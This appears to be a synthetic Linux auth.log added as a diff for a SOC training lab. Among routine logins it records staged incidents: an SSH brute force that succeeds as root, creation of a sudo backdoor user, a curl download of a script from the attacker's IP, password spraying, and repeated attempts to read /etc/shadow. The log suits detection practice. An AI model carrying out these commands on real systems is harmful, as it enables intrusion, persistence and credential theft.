@@ -1,0 +1,135 @@
+Sep 13 22:16:00 soc-lab-01 sshd[4101]: Accepted publickey for ops from 192.0.2.52 port 51295 ssh2: RSA SHA256:LabKeyops
+Sep 13 22:16:01 soc-lab-01 sshd[4104]: pam_unix(sshd:session): session opened for user ops by (uid=0)
+Sep 13 22:28:00 soc-lab-01 sshd[4105]: Accepted publickey for arjun from 192.0.2.44 port 49328 ssh2: RSA SHA256:LabKeyarjun
+Sep 13 22:28:01 soc-lab-01 sshd[4108]: pam_unix(sshd:session): session opened for user arjun by (uid=0)
+Sep 13 22:36:00 soc-lab-01 sshd[4109]: Accepted publickey for deploy from 192.0.2.24 port 43460 ssh2: RSA SHA256:LabKeydeploy
+Sep 13 22:36:01 soc-lab-01 sshd[4112]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Sep 13 22:47:00 soc-lab-01 sshd[4116]: Accepted publickey for ops from 192.0.2.38 port 41214 ssh2: RSA SHA256:LabKeyops
+Sep 13 22:47:01 soc-lab-01 sshd[4117]: pam_unix(sshd:session): session opened for user ops by (uid=0)
+Sep 13 22:48:00 soc-lab-01 sudo[4120]:     ops : TTY=pts/0 ; PWD=/home/ops ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 13 22:57:00 soc-lab-01 sshd[4123]: Accepted publickey for ops from 192.0.2.21 port 44102 ssh2: RSA SHA256:LabKeyops
+Sep 13 22:57:01 soc-lab-01 sshd[4124]: pam_unix(sshd:session): session opened for user ops by (uid=0)
+Sep 13 23:04:00 soc-lab-01 sshd[4125]: Accepted publickey for ops from 192.0.2.56 port 55324 ssh2: RSA SHA256:LabKeyops
+Sep 13 23:04:01 soc-lab-01 sshd[4126]: pam_unix(sshd:session): session opened for user ops by (uid=0)
+Sep 13 23:21:00 soc-lab-01 sshd[4129]: Accepted publickey for deploy from 192.0.2.32 port 42139 ssh2: RSA SHA256:LabKeydeploy
+Sep 13 23:21:01 soc-lab-01 sshd[4133]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Sep 13 23:27:00 soc-lab-01 sshd[4134]: Accepted publickey for priya from 192.0.2.10 port 52573 ssh2: RSA SHA256:LabKeypriya
+Sep 13 23:27:01 soc-lab-01 sshd[4135]: pam_unix(sshd:session): session opened for user priya by (uid=0)
+Sep 13 23:38:00 soc-lab-01 sshd[4138]: Accepted publickey for ops from 192.0.2.27 port 51964 ssh2: RSA SHA256:LabKeyops
+Sep 13 23:38:01 soc-lab-01 sshd[4140]: pam_unix(sshd:session): session opened for user ops by (uid=0)
+Sep 13 23:45:00 soc-lab-01 sshd[4143]: Accepted publickey for priya from 192.0.2.33 port 47992 ssh2: RSA SHA256:LabKeypriya
+Sep 13 23:45:01 soc-lab-01 sshd[4147]: pam_unix(sshd:session): session opened for user priya by (uid=0)
+Sep 13 23:58:00 soc-lab-01 sshd[4151]: Accepted publickey for deploy from 192.0.2.50 port 55370 ssh2: RSA SHA256:LabKeydeploy
+Sep 13 23:58:01 soc-lab-01 sshd[4154]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Sep 14 00:05:00 soc-lab-01 sshd[4157]: Accepted publickey for arjun from 192.0.2.17 port 55246 ssh2: RSA SHA256:LabKeyarjun
+Sep 14 00:05:01 soc-lab-01 sshd[4158]: pam_unix(sshd:session): session opened for user arjun by (uid=0)
+Sep 14 00:05:01 soc-lab-01 sshd[4190]: Invalid user admin from 203.0.113.45 port 50000
+Sep 14 00:05:01 soc-lab-01 sshd[4194]: Failed password for invalid user admin from 203.0.113.45 port 50000 ssh2
+Sep 14 00:05:05 soc-lab-01 sshd[4196]: Failed password for root from 203.0.113.45 port 50001 ssh2
+Sep 14 00:05:06 soc-lab-01 sshd[4200]: Failed password for root from 203.0.113.45 port 50002 ssh2
+Sep 14 00:05:10 soc-lab-01 sshd[4201]: Failed password for root from 203.0.113.45 port 50003 ssh2
+Sep 14 00:05:12 soc-lab-01 sshd[4202]: Failed password for root from 203.0.113.45 port 50004 ssh2
+Sep 14 00:05:15 soc-lab-01 sshd[4204]: Invalid user admin from 203.0.113.45 port 50005
+Sep 14 00:05:15 soc-lab-01 sshd[4206]: Failed password for invalid user admin from 203.0.113.45 port 50005 ssh2
+Sep 14 00:05:19 soc-lab-01 sshd[4207]: Failed password for root from 203.0.113.45 port 50006 ssh2
+Sep 14 00:05:23 soc-lab-01 sshd[4211]: Failed password for root from 203.0.113.45 port 50007 ssh2
+Sep 14 00:05:24 soc-lab-01 sshd[4214]: Failed password for root from 203.0.113.45 port 50008 ssh2
+Sep 14 00:05:26 soc-lab-01 sshd[4218]: Failed password for root from 203.0.113.45 port 50009 ssh2
+Sep 14 00:05:30 soc-lab-01 sshd[4222]: Invalid user admin from 203.0.113.45 port 50010
+Sep 14 00:05:30 soc-lab-01 sshd[4226]: Failed password for invalid user admin from 203.0.113.45 port 50010 ssh2
+Sep 14 00:05:32 soc-lab-01 sshd[4230]: Failed password for root from 203.0.113.45 port 50011 ssh2
+Sep 14 00:05:36 soc-lab-01 sshd[4231]: Failed password for root from 203.0.113.45 port 50012 ssh2
+Sep 14 00:05:40 soc-lab-01 sshd[4235]: Failed password for root from 203.0.113.45 port 50013 ssh2
+Sep 14 00:05:43 soc-lab-01 sshd[4237]: Failed password for root from 203.0.113.45 port 50014 ssh2
+Sep 14 00:05:45 soc-lab-01 sshd[4239]: Invalid user admin from 203.0.113.45 port 50015
+Sep 14 00:05:45 soc-lab-01 sshd[4242]: Failed password for invalid user admin from 203.0.113.45 port 50015 ssh2
+Sep 14 00:05:46 soc-lab-01 sshd[4244]: Failed password for root from 203.0.113.45 port 50016 ssh2
+Sep 14 00:05:47 soc-lab-01 sshd[4248]: Failed password for root from 203.0.113.45 port 50017 ssh2
+Sep 14 00:05:50 soc-lab-01 sshd[4251]: Failed password for root from 203.0.113.45 port 50018 ssh2
+Sep 14 00:05:54 soc-lab-01 sshd[4254]: Failed password for root from 203.0.113.45 port 50019 ssh2
+Sep 14 00:05:58 soc-lab-01 sshd[4256]: Invalid user admin from 203.0.113.45 port 50020
+Sep 14 00:05:58 soc-lab-01 sshd[4259]: Failed password for invalid user admin from 203.0.113.45 port 50020 ssh2
+Sep 14 00:06:00 soc-lab-01 sshd[4262]: Failed password for root from 203.0.113.45 port 50021 ssh2
+Sep 14 00:06:04 soc-lab-01 sshd[4263]: Failed password for root from 203.0.113.45 port 50022 ssh2
+Sep 14 00:06:08 soc-lab-01 sshd[4267]: Failed password for root from 203.0.113.45 port 50023 ssh2
+Sep 14 00:06:11 soc-lab-01 sshd[4269]: Failed password for root from 203.0.113.45 port 50024 ssh2
+Sep 14 00:06:12 soc-lab-01 sshd[4271]: Invalid user admin from 203.0.113.45 port 50025
+Sep 14 00:06:12 soc-lab-01 sshd[4275]: Failed password for invalid user admin from 203.0.113.45 port 50025 ssh2
+Sep 14 00:06:15 soc-lab-01 sshd[4278]: Failed password for root from 203.0.113.45 port 50026 ssh2
+Sep 14 00:06:17 soc-lab-01 sshd[4281]: Failed password for root from 203.0.113.45 port 50027 ssh2
+Sep 14 00:06:21 soc-lab-01 sshd[4285]: Failed password for root from 203.0.113.45 port 50028 ssh2
+Sep 14 00:06:24 soc-lab-01 sshd[4288]: Failed password for root from 203.0.113.45 port 50029 ssh2
+Sep 14 00:06:26 soc-lab-01 sshd[4290]: Invalid user admin from 203.0.113.45 port 50030
+Sep 14 00:06:26 soc-lab-01 sshd[4294]: Failed password for invalid user admin from 203.0.113.45 port 50030 ssh2
+Sep 14 00:06:29 soc-lab-01 sshd[4295]: Failed password for root from 203.0.113.45 port 50031 ssh2
+Sep 14 00:06:31 soc-lab-01 sshd[4296]: Failed password for root from 203.0.113.45 port 50032 ssh2
+Sep 14 00:06:33 soc-lab-01 sshd[4300]: Failed password for root from 203.0.113.45 port 50033 ssh2
+Sep 14 00:06:34 soc-lab-01 sshd[4304]: Failed password for root from 203.0.113.45 port 50034 ssh2
+Sep 14 00:06:37 soc-lab-01 sshd[4307]: Invalid user admin from 203.0.113.45 port 50035
+Sep 14 00:06:37 soc-lab-01 sshd[4311]: Failed password for invalid user admin from 203.0.113.45 port 50035 ssh2
+Sep 14 00:06:39 soc-lab-01 sshd[4315]: Failed password for root from 203.0.113.45 port 50036 ssh2
+Sep 14 00:06:42 soc-lab-01 sshd[4319]: Accepted password for root from 203.0.113.45 port 50099 ssh2
+Sep 14 00:06:43 soc-lab-01 sshd[4323]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Sep 14 00:08:42 soc-lab-01 useradd[4327]: new user: name=svc_backup, UID=1007, GID=1007, home=/home/svc_backup, shell=/bin/bash
+Sep 14 00:09:02 soc-lab-01 usermod[4329]: add 'svc_backup' to group 'sudo'
+Sep 14 00:09:42 soc-lab-01 sudo[4333]:     root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://203.0.113.45/x.sh -o /tmp/x.sh
+Sep 14 00:25:00 soc-lab-01 sshd[4159]: Accepted publickey for deploy from 192.0.2.11 port 42059 ssh2: RSA SHA256:LabKeydeploy
+Sep 14 00:25:01 soc-lab-01 sshd[4163]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Sep 14 00:44:00 soc-lab-01 sshd[4165]: Accepted publickey for ops from 192.0.2.44 port 59782 ssh2: RSA SHA256:LabKeyops
+Sep 14 00:44:01 soc-lab-01 sshd[4167]: pam_unix(sshd:session): session opened for user ops by (uid=0)
+Sep 14 01:01:00 soc-lab-01 sshd[4169]: Accepted publickey for deploy from 192.0.2.14 port 58877 ssh2: RSA SHA256:LabKeydeploy
+Sep 14 01:01:01 soc-lab-01 sshd[4170]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Sep 14 01:21:00 soc-lab-01 sshd[4172]: Accepted publickey for ops from 192.0.2.14 port 52199 ssh2: RSA SHA256:LabKeyops
+Sep 14 01:21:01 soc-lab-01 sshd[4173]: pam_unix(sshd:session): session opened for user ops by (uid=0)
+Sep 14 01:29:00 soc-lab-01 sshd[4176]: Accepted publickey for deploy from 192.0.2.32 port 58417 ssh2: RSA SHA256:LabKeydeploy
+Sep 14 01:29:01 soc-lab-01 sshd[4178]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Sep 14 01:30:00 soc-lab-01 sudo[4181]:     deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 14 01:40:33 soc-lab-01 sshd[4336]: Invalid user alice from 198.51.100.77 port 47421
+Sep 14 01:40:33 soc-lab-01 sshd[4338]: Failed password for invalid user alice from 198.51.100.77 port 53378 ssh2
+Sep 14 01:40:59 soc-lab-01 sshd[4341]: Invalid user bob from 198.51.100.77 port 53476
+Sep 14 01:40:59 soc-lab-01 sshd[4342]: Failed password for invalid user bob from 198.51.100.77 port 49104 ssh2
+Sep 14 01:41:37 soc-lab-01 sshd[4345]: Invalid user carol from 198.51.100.77 port 48114
+Sep 14 01:41:37 soc-lab-01 sshd[4347]: Failed password for invalid user carol from 198.51.100.77 port 40487 ssh2
+Sep 14 01:42:10 soc-lab-01 sshd[4350]: Invalid user dave from 198.51.100.77 port 46389
+Sep 14 01:42:10 soc-lab-01 sshd[4354]: Failed password for invalid user dave from 198.51.100.77 port 46512 ssh2
+Sep 14 01:42:49 soc-lab-01 sshd[4357]: Invalid user erin from 198.51.100.77 port 43773
+Sep 14 01:42:49 soc-lab-01 sshd[4360]: Failed password for invalid user erin from 198.51.100.77 port 58316 ssh2
+Sep 14 01:43:24 soc-lab-01 sshd[4362]: Invalid user frank from 198.51.100.77 port 46176
+Sep 14 01:43:24 soc-lab-01 sshd[4364]: Failed password for invalid user frank from 198.51.100.77 port 41206 ssh2
+Sep 14 01:43:45 soc-lab-01 sshd[4365]: Invalid user grace from 198.51.100.77 port 50185
+Sep 14 01:43:45 soc-lab-01 sshd[4366]: Failed password for invalid user grace from 198.51.100.77 port 48068 ssh2
+Sep 14 01:44:19 soc-lab-01 sshd[4367]: Invalid user heidi from 198.51.100.77 port 46651
+Sep 14 01:44:19 soc-lab-01 sshd[4368]: Failed password for invalid user heidi from 198.51.100.77 port 40943 ssh2
+Sep 14 01:44:58 soc-lab-01 sshd[4372]: Invalid user ivan from 198.51.100.77 port 40933
+Sep 14 01:44:58 soc-lab-01 sshd[4374]: Failed password for invalid user ivan from 198.51.100.77 port 45718 ssh2
+Sep 14 01:45:00 soc-lab-01 sshd[4185]: Accepted publickey for priya from 192.0.2.12 port 49031 ssh2: RSA SHA256:LabKeypriya
+Sep 14 01:45:01 soc-lab-01 sshd[4188]: pam_unix(sshd:session): session opened for user priya by (uid=0)
+Sep 14 01:45:41 soc-lab-01 sshd[4378]: Invalid user judy from 198.51.100.77 port 47024
+Sep 14 01:45:41 soc-lab-01 sshd[4382]: Failed password for invalid user judy from 198.51.100.77 port 49336 ssh2
+Sep 14 01:46:26 soc-lab-01 sshd[4386]: Invalid user mallory from 198.51.100.77 port 58450
+Sep 14 01:46:26 soc-lab-01 sshd[4387]: Failed password for invalid user mallory from 198.51.100.77 port 49556 ssh2
+Sep 14 01:46:55 soc-lab-01 sshd[4388]: Invalid user oscar from 198.51.100.77 port 41309
+Sep 14 01:46:55 soc-lab-01 sshd[4389]: Failed password for invalid user oscar from 198.51.100.77 port 59019 ssh2
+Sep 14 01:47:33 soc-lab-01 sshd[4392]: Invalid user peggy from 198.51.100.77 port 58538
+Sep 14 01:47:33 soc-lab-01 sshd[4395]: Failed password for invalid user peggy from 198.51.100.77 port 43523 ssh2
+Sep 14 01:48:16 soc-lab-01 sshd[4397]: Invalid user trent from 198.51.100.77 port 46240
+Sep 14 01:48:16 soc-lab-01 sshd[4400]: Failed password for invalid user trent from 198.51.100.77 port 43562 ssh2
+Sep 14 01:48:50 soc-lab-01 sshd[4404]: Invalid user victor from 198.51.100.77 port 45500
+Sep 14 01:48:50 soc-lab-01 sshd[4407]: Failed password for invalid user victor from 198.51.100.77 port 40152 ssh2
+Sep 14 01:49:19 soc-lab-01 sshd[4411]: Invalid user walter from 198.51.100.77 port 59679
+Sep 14 01:49:19 soc-lab-01 sshd[4412]: Failed password for invalid user walter from 198.51.100.77 port 52059 ssh2
+Sep 14 08:15:00 soc-lab-01 sshd[4416]: Failed password for priya from 192.0.2.14 port 51234 ssh2
+Sep 14 08:15:09 soc-lab-01 sshd[4420]: Failed password for priya from 192.0.2.14 port 51235 ssh2
+Sep 14 08:15:18 soc-lab-01 sshd[4423]: Accepted password for priya from 192.0.2.14 port 51236 ssh2
+Sep 14 09:00:15 soc-lab-01 sudo[4426]:     arjun : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/arjun ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Sep 14 09:00:30 soc-lab-01 sudo[4429]:     arjun : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/arjun ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Sep 14 09:00:45 soc-lab-01 sudo[4432]:     arjun : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/arjun ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Sep 14 09:01:00 soc-lab-01 sudo[4434]:     arjun : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/arjun ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Sep 14 09:30:00 soc-lab-01 su[4435]: (to root) arjun on pts/1
+Sep 14 09:30:00 soc-lab-01 su[4438]: pam_unix(su:auth): authentication failure; logname=arjun uid=1002 euid=0 tty=pts/1 ruser=arjun rhost=  user=root
+Sep 14 10:16:00 soc-lab-01 sshd[4442]: Accepted publickey for deploy from 192.0.2.40 port 58086 ssh2: RSA SHA256:LabKeydeploy
+Sep 14 10:29:00 soc-lab-01 sshd[4444]: Accepted publickey for ops from 192.0.2.39 port 58310 ssh2: RSA SHA256:LabKeyops
+Sep 14 10:52:00 soc-lab-01 sshd[4445]: Accepted publickey for priya from 192.0.2.25 port 54387 ssh2: RSA SHA256:LabKeypriya
+Sep 14 10:57:00 soc-lab-01 sshd[4446]: Accepted publickey for deploy from 192.0.2.46 port 55844 ssh2: RSA SHA256:LabKeydeploy
+Sep 14 11:05:00 soc-lab-01 sshd[4448]: Accepted publickey for deploy from 192.0.2.46 port 42789 ssh2: RSA SHA256:LabKeydeploy
+Sep 14 11:11:00 soc-lab-01 sshd[4452]: Accepted publickey for arjun from 192.0.2.23 port 42374 ssh2: RSA SHA256:LabKeyarjun
